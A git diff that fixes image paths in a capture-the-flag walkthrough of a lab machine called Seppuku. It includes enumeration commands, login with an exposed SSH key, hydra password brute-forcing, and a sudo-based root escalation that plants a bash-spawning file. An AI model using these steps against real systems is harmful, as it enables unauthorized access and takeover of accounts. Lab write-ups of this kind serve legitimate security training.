@@ -82,7 +82,7 @@ enum4linux 192.160.177.90
 
 we found users on the system&#x20;
 
-<figure><img src="../.gitbook/assets/users.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/users.png" alt=""><figcaption></figcaption></figure>
 
 ```markdown
 [+] Enumerating users using SID S-1-22-1 and logon username '', password ''  
@@ -97,19 +97,19 @@ S-1-22-1-1002 Unix User\tanto (Local User)
 
 . port 80 requires a login, butrueforce is dead end . it has no sub-directories
 
-<figure><img src="../.gitbook/assets/Screenshot_2024-01-21_22-45-50.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Screenshot_2024-01-21_22-45-50.png" alt=""><figcaption></figcaption></figure>
 
 port 8088 it has sub-directories but don't work, rabbit-hole
 
-<figure><img src="../.gitbook/assets/8088.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/8088.png" alt=""><figcaption></figcaption></figure>
 
 sub-dircetories they don't work&#x20;
 
-<figure><img src="../.gitbook/assets/808.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/808.png" alt=""><figcaption></figcaption></figure>
 
 port 7601&#x20;
 
-<figure><img src="../.gitbook/assets/7601.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/7601.png" alt=""><figcaption></figcaption></figure>
 
 sub-directory enumeration on port 7601
 
@@ -117,27 +117,27 @@ sub-directory enumeration on port 7601
 gobuster dir -u http://192.168.177.90:7601/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x html,txt,php 
 ```
 
-<figure><img src="../.gitbook/assets/76.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/76.png" alt=""><figcaption></figcaption></figure>
 
 found a static page, on /ckeditor&#x20;
 
-<figure><img src="../.gitbook/assets/ststic.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/ststic.png" alt=""><figcaption></figcaption></figure>
 
 founds some files in keys directory
 
-<figure><img src="../.gitbook/assets/keys.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/keys.png" alt=""><figcaption></figcaption></figure>
 
 These two file are ssh keys to but to what users.&#x20;
 
-<figure><img src="../.gitbook/assets/pri.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/pri.png" alt=""><figcaption></figcaption></figure>
 
 another static page /production
 
-<figure><img src="../.gitbook/assets/pro.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/pro.png" alt=""><figcaption></figcaption></figure>
 
 &#x20;/secret
 
-<figure><img src="../.gitbook/assets/scret.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/scret.png" alt=""><figcaption></figcaption></figure>
 
 We have received a password list , we are going o use it to brute-force the ssh and see if we might gave i login. trying the private key obtained
 
@@ -148,7 +148,7 @@ ssh -i private tanto@192.168.177.90
 
 We have access to tanto&#x20;
 
-<figure><img src="../.gitbook/assets/tanto.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/tanto.png" alt=""><figcaption></figcaption></figure>
 
 go to unrestricted terminal
 
@@ -159,7 +159,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 enter into /home/seppuku find the local.txt, but we also see a .passwd file&#x20;
 
-<figure><img src="../.gitbook/assets/pass.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/pass.png" alt=""><figcaption></figcaption></figure>
 
 we have a found a password but \[12345685213456!@!@A] but its for which user
 
@@ -173,7 +173,7 @@ the password we found was for samurai change to unrestricted shell
 echo $$ bash
 ```
 
-<figure><img src="../.gitbook/assets/sum.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/sum.png" alt=""><figcaption></figcaption></figure>
 
 with hydra we also found the password of seppuku
 
@@ -181,11 +181,11 @@ with hydra we also found the password of seppuku
 hydra -l seppuku -P password.lst ssh://192.168.177.90
 ```
 
-<figure><img src="../.gitbook/assets/hyd.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/hyd.png" alt=""><figcaption></figcaption></figure>
 
 logging in&#x20;
 
-<figure><img src="../.gitbook/assets/sep.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/sep.png" alt=""><figcaption></figcaption></figure>
 
 ## privilege escalation
 
@@ -195,7 +195,7 @@ sudo -l
 
 when we run sudo -l on user samurai we see he ca run some files&#x20;
 
-<figure><img src="../.gitbook/assets/pri1.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/pri1.png" alt=""><figcaption></figcaption></figure>
 
 ```markdown
 (ALL) NOPASSWD: /../../../../../../home/tanto/.cgi_bin/bin /tmp/*
@@ -207,7 +207,7 @@ we are going to create the .cgi\_bin file in tanto because it doesn't exist thei
 mkdir .cgi_bin
 ```
 
-<figure><img src="../.gitbook/assets/cgi.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/cgi.png" alt=""><figcaption></figcaption></figure>
 
 and also we are going to create a bin file which might help has to get a root shell
 
@@ -216,7 +216,7 @@ echo '/bin/bash' > bin
 chmod 777 bin
 ```
 
-<figure><img src="../.gitbook/assets/cg.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/cg.png" alt=""><figcaption></figcaption></figure>
 
 root user
 
@@ -224,6 +224,6 @@ root user
 sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/*
 ```
 
-<figure><img src="../.gitbook/assets/root.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/root.png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/rt.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/rt.png" alt=""><figcaption></figcaption></figure>
